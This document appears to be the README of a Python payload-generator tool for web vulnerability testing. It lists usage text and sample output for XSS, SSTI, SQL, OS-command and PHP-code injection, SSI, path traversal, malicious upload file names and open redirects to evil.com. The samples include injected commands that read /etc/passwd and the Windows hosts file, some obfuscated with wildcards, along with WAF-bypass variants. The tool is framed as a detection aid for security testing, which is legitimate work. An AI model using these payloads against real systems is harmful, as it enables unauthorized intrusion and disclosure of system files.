# Payload Generator
Payload Generator Tool. These payloads are only help to detect the vulnerability. 

- [x] XSS Payload Generation
- [x] SSTI Payload Generation
- [x] HTML Injection Payload Generation
- [x] Open Redirection Payload Generation
- [x] SQL Injection Payload Generation
- [x] Command Injection Payload Generation
- [x] SSI Injection Payload Generation
- [x] PHP Code Injection Payload Generation
- [x] File & Path Traversal Payload Generation
- [x] Upload File Name Payload Generation


## XSS Payloads

### Help

```bash
usage: generator.py xss [-h] [--popup] [--logger] [--oast] [--dom] [--ored] [--oast-domain] [--unique-string] [--waf] [--reverse-payloads] [--urlencode]

options:
  -h, --help          show this help message and exit

XSS Payload Types:
  --popup             Generate Popup Payloads
  --logger            Generate Console.log() Payloads
  --oast              Generate OAST Payloads
  --dom               Generate DOM Payloads
  --ored              Generate ORED Payloads

XSS Payload Options:
  --oast-domain       Set OAST Domain for payloads
  --unique-string     Set Unique String for testing

XSS Payload Mutations:
  --waf               Generate WAF Bypass Payloads
  --reverse-payloads  Generate Reverse Payloads
  --urlencode         Set URL Encoding for payload generator
```

### Generate Popup Payloads

```bash
python3 generator.py xss --popup 
confirm("yDrQfNiA5EdYHhmJIWMw")
confirm`yDrQfNiA5EdYHhmJIWMw`
(confirm`yDrQfNiA5EdYHhmJIWMw`)
{confirm`yDrQfNiA5EdYHhmJIWMw`}
[confirm`yDrQfNiA5EdYHhmJIWMw`]
(((confirm)))`yDrQfNiA5EdYHhmJIWMw`
new class extends confirm`yDrQfNiA5EdYHhmJIWMw`{}
["yDrQfNiA5EdYHhmJIWMw"].find(confirm)
[1337].map(confirm)
<svg/onload="confirm("yDrQfNiA5EdYHhmJIWMw")">
[...]
```

## PHP

### Help

```bash
usage: generator.py php [-h] [--oast-domain] [--unique-string] [--sleep-timeout] [--urlencode]

options:
  -h, --help        show this help message and exit

PHP CI Payload Options:
  --oast-domain     Set OAST Domain for payloads
  --unique-string   Set Unique String for testing
  --sleep-timeout   Set Sleep Timeout

PHP Payload Mutations:
  --urlencode       Set URL Encoding for payload generator
```


### Generate Payloads

```bash
system("cat /etc/passwd")
system("cat /etc/passwd");
;system("cat /etc/passwd");
<?php system("cat /etc/passwd"); ?>
system("sleep 17")
system("sleep 17");
;system("sleep 17");
<?php system("sleep 17"); ?>
system("timeout /T 17")
system("timeout /T 17");
;system("timeout /T 17");
<?php system("timeout /T 17"); ?>
system("echo PLmyJkJgSdo5iQ9lDAnH")
system("echo PLmyJkJgSdo5iQ9lDAnH");
;system("echo PLmyJkJgSdo5iQ9lDAnH");
<?php system("echo PLmyJkJgSdo5iQ9lDAnH"); ?>
[...]
```


## Open Redirection (ORED)

### Help

```bash
usage: generator.py ored [-h] [--oast-domain] [--unique-string] [--whitelisted-domain] [--xss-payloads] [--urlencode]

options:
  -h, --help            show this help message and exit

Open Redirection Payload Options:
  --oast-domain         Set OAST Domain for payloads
  --unique-string       Set Unique String for testing
  --whitelisted-domain 
                        Set Whitelisted domain for testing
  --xss-payloads        Generate XSS Payloads

Open Redirection Payload Mutations:
  --urlencode           Set URL Encoding for payload generator
```

### Generate Payloads

```bash
python3 generator.py ored --oast-domain evil.com --whitelisted-domain github.com
/〱evil.com
〱evil.com
/〵evil.com
〵evil.com
/ゝevil.com
ゝevil.com
/ーevil.com
ーevil.com
/ｰevil.com
ｰevil.com
/%09/evil.com
//%09/evil.com
///%09/evil.com
////%09/evil.com
/%09/evil.com@evil.com
//%09/evil.com@evil.com
///%09/evil.com@evil.com
////%09/evil.com@evil.com
/%09/github.com@evil.com
//%09/github.com@evil.com
///%09/github.com@evil.com
////%09/github.com@evil.com
```

## Server-Side Template Injection (SSTI)

### Usage

```bash
usage: generator.py ssti [-h] [--reflective] [--oast] [--timeout] [--oast-domain] [--unique-string] [--sleep-timeout] [--number] [--multiply] [-w] [-l] [--urlencode]

options:
  -h, --help        show this help message and exit

Service-Side Template Injection Payload Types:
  --reflective      Generate reflective payloads
  --oast            Generate OAST payloads
  --timeout         Generate Time-Based payloads

Service-Side Template Injection Payload Options:
  --oast-domain     Set OAST Domain for payloads
  --unique-string   Set Unique String for testing
  --sleep-timeout   Set Sleep Timeout for payload genrating
  --number          Set number for payload genrating
  --multiply        Set string multiply number for payload genrating

SSTI Platform Options:
  -w, --windows     Generate Windows Based payloads
  -l, --linux       Generate Linux Based payloads

Server Side Template Injection Payload Mutations:
  --urlencode       Set URL Encoding for payload generator
```


### Generate Payloads

```bash
python3 generator.py ssti --timeout --linux                   
@{@:dML9BHG7cEaAjv3sMyXQ}
{{7*"dML9BHG7cEaAjv3sMyXQ"}}
<%=1337*1337%>
{1337*1337}
${"1337"+"1337"}
<%"1337"+"1337"%>
{system('sleep 15')}
#{7*"dML9BHG7cEaAjv3sMyXQ"}
${7*"dML9BHG7cEaAjv3sMyXQ"}
{"1337"+"1337"}
{php}sleep 15;{/php}
{{1337*1337}}
<%7*"dML9BHG7cEaAjv3sMyXQ"%>
@{Response.Write("dML9BHG7cEaAjv3sMyXQ");}
<%1337*1337%>
```

## SQL Injection

### Help

```bash
usage: generator.py sqli [-h] [--error-based] [--time-based] [--union-based] [--auth-bypass] [--sleep-timeout]

options:
  -h, --help        show this help message and exit

SQL Injection Payload Types:
  --error-based     Generate Error Based payloads
  --time-based      Generate Time Based payloads
  --union-based     Generate Union Based payloads
  --auth-bypass     Generate Auth Bypass payloads

SQL Injection Payload Options:
  --sleep-timeout   Set Sleep Timeout for payload genrating
```


## Server-Side Script Include (SSI)


### Help

```bash
usage: generator.py ssi [-h] [--reflective] [--time-based] [--oast] [--sleep-timeout] [--oast-domain] [--unique-string] [-w] [-l] [--urlencode]

options:
  -h, --help        show this help message and exit

SSI Payload Types:
  --reflective      Generate Reflective payloads
  --time-based      Generate Time Based payloads
  --oast            Generate OAST payloads

SSI Payload Options:
  --sleep-timeout   Set Sleep Timeout for payload genrating
  --oast-domain     Set OAST Domain for payload genrating
  --unique-string   Set Unique string for payload genrating

SSI Platform Options:
  -w, --windows     Generate Windows Based payloads
  -l, --linux       Generate Linux Based payloads

SSI Payload Mutations:
  --urlencode       Set URL Encoding for payload generator
```

## File & Path Traversal

### Help

```bash
usage: generator.py traversal [-h] [--file-traversal] [--path-traversal] [--all] [--depth] [--custom-file CUSTOM_FILE [CUSTOM_FILE ...]] [--custom-path CUSTOM_PATH [CUSTOM_PATH ...]] [-w] [-l] [--urlencode]

options:
  -h, --help            show this help message and exit

File & Path Traversal Payload Types:
  --file-traversal      Generate File Traversal Payloads
  --path-traversal      Generate Path Traversal Payloads
  --all                 Generate All Traversal Payloads

File & Path Traversal Payload Options:
  --depth               Generated Traversal Depth
  --custom-file CUSTOM_FILE [CUSTOM_FILE ...]
                        Generated Traversal Depth
  --custom-path CUSTOM_PATH [CUSTOM_PATH ...]
                        Generated Traversal Depth

File & Path Traversal Platform Options:
  -w, --windows         Generate Windows Based payloads
  -l, --linux           Generate Linux Based payloads

File & Path Traversal Payload Mutations:
  --urlencode           Set URL Encoding for Payloads
```

## HTML Injection

### Help

```bash
usage: generator.py htmli [-h] [--html-tags] [--html-events] [--combo-list] [--unique-string] [--tag  [...]] [--event  [...]] [--include-id] [--payload  [...]] [--urlencode] [--strip-space] [--tag-breaking] [--null-byte]

options:
  -h, --help         show this help message and exit

HTML Injection Payload Types:
  --html-tags        Generate HTML tags
  --html-events      Generate HTML Events
  --combo-list       Generate Combo List

HTML Injection Payload Options:
  --unique-string    Set Unique string for payload genrating
  --tag  [ ...]      Set Unique TAG for payload genrating
  --event  [ ...]    Set Unique TAG for payload genrating
  --include-id       Include ID into payloads
  --payload  [ ...]  Add Custom Payloads

HTML Injection Payload Mutations:
  --urlencode        Set URL Encoding for Payloads
  --strip-space      Change space in Payloads
  --tag-breaking     Apply Tag Breaking
  --null-byte        Apply Null Byte Injection
                                              
```

### Generate Example Payloads

```bash
python3 generator.py htmli --strip-space --tag "img" --tag "s" --tag "h1" --combo-list --null-byte --event "onerror" --event "onmouseover" --include-id --payload "confirm\`\`" 
<img/onmouseover=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
<h1/onmouseover=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
<s/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
<img/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
<h1/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
<s/onmouseover=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
```

## OS Command Injection

### Help

```bash
usage: generator.py os [-h] [--reflective] [--time-based] [--oast] [--unique-string] [--sleep-timeout] [--oast-domain] [-w] [-l] [--urlencode] [--wildcard] [--waf]

options:
  -h, --help        show this help message and exit

OS Command Injection Payload Types:
  --reflective      Generate Reflective Payloads
  --time-based      Generate Time-Based Payloads
  --oast            Generate OAST Payloads

OS Command Injection Payload Options:
  --unique-string   Set Unique String
  --sleep-timeout   Set Sleep Timeout
  --oast-domain     Set OAST Domain

OS Command Injection Platform Options:
  -w, --windows     Generate Windows Based payloads
  -l, --linux       Generate Linux Based payloads

OS Command Injection Payload Mutation Options:
  --urlencode       URL Encode the payloads
  --wildcard        Wildcard Bypass Linux Reflective payloads
  --waf             Apply Waf Bypass

```

### Example Payload Generation

```bash
python3 generator.py os --reflective --wildcard | head -n 20
'echo kzie5pWQWUJZW45UBWDs\t
"cat /proc/version%0a
`cat /?tc/?a??wd&&
${IFS}cat /proc/version%0a
|cat /?r?c/v?r?i?n!
'echo $(( 1337 * 1337 ))%0a
#yes kzie5pWQWUJZW45UBWDs | head -n 3 | tr -d '\n';
$type C:\Windows\System32\drivers\etc\hosts$
#cat /?tc/?a??wd%0a
&&type C:\Windows\System32\drivers\etc\hosts"
\tcat /?tc/?a??wd#
#type C:\Windows\System32\drivers\etc\hosts#
/cat /?r?c/v?r?i?n\t
&cat /proc/version/
;echo kzie5pWQWUJZW45UBWDs/
\nyes kzie5pWQWUJZW45UBWDs | head -n 3 | tr -d '\n'`
/echo $(( 1337 * 1337 ))!
\tcat /etc/passwd!
&type C:\Windows\System32\drivers\etc\hosts|
"type C:\Windows\System32\drivers\etc\hosts%0a
```


## Uplod File Name Payload Generation

### Help

```bash
usage: generator.py upload [-h] [--php] [--asp] [--jsp] [--perl] [--coldfusion] [--node] [--custom] [-a] [-c  [...]] [-d] [-f] [--swapcase] [--double] [--nullname] [--dotname] [--slashname] [--all] [--path-traversal]
                           [--command-injection]

options:
  -h, --help            show this help message and exit

File Extension Options:
  --php                 Generate PHP extensions
  --asp                 Generate ASP extensions
  --jsp                 Generate JSP extensions
  --perl                Generate Perl extensions
  --coldfusion          Generate Coldfusion extensions
  --node                Generate NODE JS extensions
  --custom              Generate Custom extensions
  -a , --alowed-extensions 
                        Set Allowed Extensions

Upload File Name Payload Options:
  -c  [ ...], --command  [ ...]
                        Add commands for Command injection
  -d , --depth          Set Path Traversal Max depth.
  -f , --original-filename 
                        Set Original Filename

Upload File Name Payload Generators:
  --swapcase            Swapping case in extension randomly
  --double              Double the extensions
  --nullname            Insert null characters into the filename
  --dotname             Insert dots after the filename
  --slashname           Insert slashes into the extensions
  --all                 Generate All Payloads

Upload File Name Vulnerability Generators:
  --path-traversal      Generate Path Traversal Filenames
  --command-injection   Generate Command Injection Filenames
```
